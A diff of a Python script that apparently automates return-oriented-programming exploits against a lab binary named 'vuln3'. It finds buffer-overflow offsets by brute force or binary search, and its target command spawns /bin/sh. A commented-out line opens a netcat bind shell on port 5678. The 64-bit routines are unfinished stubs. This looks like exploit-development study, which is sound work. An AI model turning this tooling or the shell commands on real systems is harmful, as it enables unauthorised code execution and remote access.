@@ -1,7 +1,7 @@
 import os
 import ROPcompile
 
-BINARY_BITS = 64
+BINARY_BITS = 32
 
 BRUTE_FORCE = 0
 BINARY_SEARCH = 1
@@ -9,7 +9,7 @@ ANALYSIS = 2
 
 #COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"/bin//sh\", NULL)"
 COMMAND = "execve(\"/bin//sh\")"
-PROGRAM = "vuln3-non-static"
+PROGRAM = "vuln3"
 FILE_MODE = True
 
 def main():
@@ -29,19 +29,37 @@ def main():
     #STEP 3b - Verify success with random .data
 
 def bufferDiscovery(mode, program):
-    if(mode == BRUTE_FORCE):
-        #Do Something
-        print("Brute Force")
-        return bruteForce(program)
-    if(mode == BINARY_SEARCH):
-        #Do Something
-        print("Binary Search")
-        return binarySearch(program)
-    if(mode == ANALYSIS):
-        #Do Something
-        print("Analysis")
+    global BINARY_BITS
 
-def bruteForce(program):
+    if BINARY_BITS == 32:
+        if(mode == BRUTE_FORCE):
+            print("Brute Force")
+            return bruteForce32(program)
+        
+        if(mode == BINARY_SEARCH):
+            print("Binary Search")
+            return binarySearch32(program)
+        
+        if(mode == ANALYSIS):
+            #Do Something
+            print("Analysis")
+        
+
+    if BINARY_BITS == 64:
+        if(mode == BRUTE_FORCE):
+            print("Brute Force")
+            return bruteForce64(program)
+        
+        if(mode == BINARY_SEARCH):
+            print("Binary Search")
+            return binarySearch64(program)
+        
+        if(mode == ANALYSIS):
+            #Do Something
+            print("Analysis")
+        
+
+def bruteForce32(program):
     fileLoc = "payload"
     test = open(fileLoc, "w")
     payload = ""
@@ -54,7 +72,15 @@ def bruteForce(program):
             return i - 1 + (BINARY_BITS/8)
     return -1
 
-def binarySearch(program):
+def bruteForce64(program):
+    fileLoc = "payload"
+    test = open(fileLoc, "w")
+    payload = ""
+    
+    #TODO write bruteForce for 64 bit binaries
+
+
+def binarySearch32(program):
     fileLoc = "payload"
     payload = ""
     found = False
@@ -86,6 +112,16 @@ def binarySearch(program):
             found = True
 
     return High + int(BINARY_BITS/8)
+
+def binarySearch64(program):
+    fileLoc = "payload"
+    payload = ""
+    found = False
+    Low = 1
+    High = 8192 # Arbitrary High value
+    output = 0
+
+    #TODO Write Binary Search for 64 bit binaries
 
 
 def writePayload(file, string):
